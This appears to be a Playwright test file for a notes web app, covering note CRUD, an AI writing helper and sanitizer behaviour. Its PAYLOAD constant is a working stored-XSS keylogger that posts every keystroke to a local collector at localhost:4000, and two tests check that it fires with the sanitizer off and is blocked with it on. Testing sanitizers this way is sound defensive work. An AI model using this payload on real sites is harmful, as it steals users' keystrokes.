import { test, expect, type APIRequestContext, type Page } from '@playwright/test';
import fs from 'fs';
import path from 'path';

const API_BASE_URL = 'http://localhost:3001';
const NOTES_URL = `${API_BASE_URL}/notes`;
const KEYLOG_PATH = path.resolve(process.cwd(), '../keylog.txt');

const PAYLOAD =
  `hello <img src=x onerror="document.addEventListener('keydown',function(e){fetch('http://localhost:4000/log',{method:'POST',body:e.key})})"> world`;

type TestUser = {
  name: string;
  email: string;
  username: string;
  password: string;
};

type LoginResult = {
  token: string;
  user: {
    name: string;
    email: string;
    username: string;
  };
};

type CreatedNote = {
  _id: string;
  title: string;
  content: string;
  author: {
    name: string;
    email: string;
  } | null;
};

const makeTestUser = (): TestUser => {
  const uniqueValue = Date.now() + Math.floor(Math.random() * 100000);

  return {
    name: `Test User ${uniqueValue}`,
    email: `test-${uniqueValue}@example.com`,
    username: `testuser${uniqueValue}`,
    password: 'password123',
  };
};

const registerAndLogin = async (
  request: APIRequestContext,
  user = makeTestUser()
): Promise<LoginResult> => {
  const createUserResponse = await request.post(`${API_BASE_URL}/users`, {
    data: user,
  });

  expect(createUserResponse.ok()).toBeTruthy();

  const loginResponse = await request.post(`${API_BASE_URL}/login`, {
    data: {
      username: user.username,
      password: user.password,
    },
  });

  expect(loginResponse.ok()).toBeTruthy();

  return (await loginResponse.json()) as LoginResult;
};

const loginInBrowser = async (page: Page, loginResult: LoginResult) => {
  await page.addInitScript(
    ({ token, user }) => {
      localStorage.setItem('token', token);
      localStorage.setItem('currentUser', JSON.stringify(user));
    },
    loginResult
  );
};

const createNote = async (
  request: APIRequestContext,
  token: string,
  content = 'Seed note for test'
): Promise<CreatedNote> => {
  const response = await request.post(NOTES_URL, {
    headers: {
      Authorization: `Bearer ${token}`,
    },
    data: {
      title: 'test note',
      content,
    },
  });

  expect(response.ok()).toBeTruthy();

  return (await response.json()) as CreatedNote;
};

const createUser = async (
  request: APIRequestContext,
  user = makeTestUser()
): Promise<TestUser> => {
  const response = await request.post(`${API_BASE_URL}/users`, {
    data: user,
  });

  expect(response.ok()).toBeTruthy();

  return user;
};

const loginThroughForm = async (page: Page, user: TestUser) => {
  await page.goto('/login');

  await page.getByTestId('login_form_username').fill(user.username);
  await page.getByTestId('login_form_password').fill(user.password);
  await page.getByTestId('login_form_login').click();

  await expect(page.getByTestId('logout')).toBeVisible();
};

test.describe('Notes CRUD flow', () => {
  test('reads notes from the page', async ({ page, request }) => {
    const loginResult = await registerAndLogin(request);
    const note = await createNote(request, loginResult.token, 'Read test note');

    await page.goto('/');

    await expect(page.getByRole('heading', { name: 'Fun Facts' })).toBeVisible();

    const createdNote = page.getByTestId(note._id);
    await expect(createdNote).toBeVisible();
    await expect(createdNote).toContainText('Read test note');
    await expect(page.locator('.note').first()).toBeVisible();
  });

  test('creates a new note', async ({ page, request }) => {
    const loginResult = await registerAndLogin(request);
    await loginInBrowser(page, loginResult);

    await page.goto('/');

    await page.getByRole('button', { name: 'Add new note' }).click();

    const newNoteInput = page.getByTestId('text_input_new_note');
    await expect(newNoteInput).toBeVisible();

    await newNoteInput.fill('Playwright created note');
    await page.getByTestId('text_input_save_new_note').click();

    await expect(page.locator('.notification')).toHaveText('Added a new note');

    await expect(
      page.locator('.note').filter({ hasText: 'Playwright created note' }).first()
    ).toBeVisible();
  });

  test('updates a note', async ({ page, request }) => {
    test.setTimeout(15000);

    const loginResult = await registerAndLogin(request);
    const note = await createNote(
      request,
      loginResult.token,
      'Original note before update'
    );

    await loginInBrowser(page, loginResult);
    await page.goto('/');

    const noteElement = page.getByTestId(note._id);
    await expect(noteElement).toBeVisible();

    await page.getByTestId(`edit-${note._id}`).click();

    const textarea = page.getByTestId(`text_input-${note._id}`);
    await expect(textarea).toBeVisible();

    await textarea.fill('Playwright updated note');
    await page.getByTestId(`text_input_save-${note._id}`).click();

    await expect(page.locator('.notification')).toHaveText('Note updated');

    await expect(noteElement).toBeVisible();
    await expect(noteElement).toContainText('Playwright updated note');
  });

  test('deletes a note', async ({ page, request }) => {
    const loginResult = await registerAndLogin(request);
    const note = await createNote(request, loginResult.token, 'Note to delete');

    await loginInBrowser(page, loginResult);
    await page.goto('/');

    const noteElement = page.getByTestId(note._id);
    await expect(noteElement).toBeVisible();

    await page.getByTestId(`delete-${note._id}`).click();

    await expect(page.locator('.notification')).toHaveText('Note deleted');
    await expect(page.getByTestId(note._id)).toHaveCount(0);
  });

  test('uses the AI helper to generate note text', async ({ page, request }) => {
    test.setTimeout(30000);

    const user = await createUser(request);
    await loginThroughForm(page, user);

    await page.getByTestId('add_new_note').click();

    const newNoteInput = page.getByTestId('text_input_new_note');
    await expect(newNoteInput).toBeVisible();
    await expect(newNoteInput).toHaveValue('');

    await page.getByTestId('help_me_write').click();

    await page
      .getByTestId('help_me_write_prompt')
      .fill('Write a short fun fact based on my notes');

    await page.getByTestId('help_me_write_submit').click();

    await expect(newNoteInput).not.toHaveValue('', { timeout: 30000 });
  });

  test('renders rich HTML correctly', async ({ page, request }) => {
    const loginResult = await registerAndLogin(request);

    const note = await createNote(
      request,
      loginResult.token,
      'Hello <b>world</b>'
    );

    await page.goto('/');

    const body = page.getByTestId(note._id).getByTestId('note_body');

    await expect(body.locator('b')).toHaveText('world');
  });

  test('XSS works when sanitizer is OFF', async ({ page, request }) => {
  fs.writeFileSync(KEYLOG_PATH, '');

  const loginResult = await registerAndLogin(request);
  await createNote(request, loginResult.token, PAYLOAD);

  await page.goto('/');

  await page.getByTestId('sanitizer_toggle').click();

  await page.waitForTimeout(500);

  await page.keyboard.type('abc');

  await page.waitForTimeout(1000);

  const log = fs.readFileSync(KEYLOG_PATH, 'utf8');

  expect(log).toContain('a');
  expect(log).toContain('b');
  expect(log).toContain('c');
});

  test('XSS is blocked when sanitizer is ON', async ({ page, request }) => {
    fs.writeFileSync(KEYLOG_PATH, '');

    const loginResult = await registerAndLogin(request);
    await createNote(request, loginResult.token, PAYLOAD);

    await page.goto('/');

    await page.keyboard.type('abc');

    await page.waitForTimeout(1000);

    const log = fs.readFileSync(KEYLOG_PATH, 'utf8');

    expect(log.trim()).toBe('');
  });
});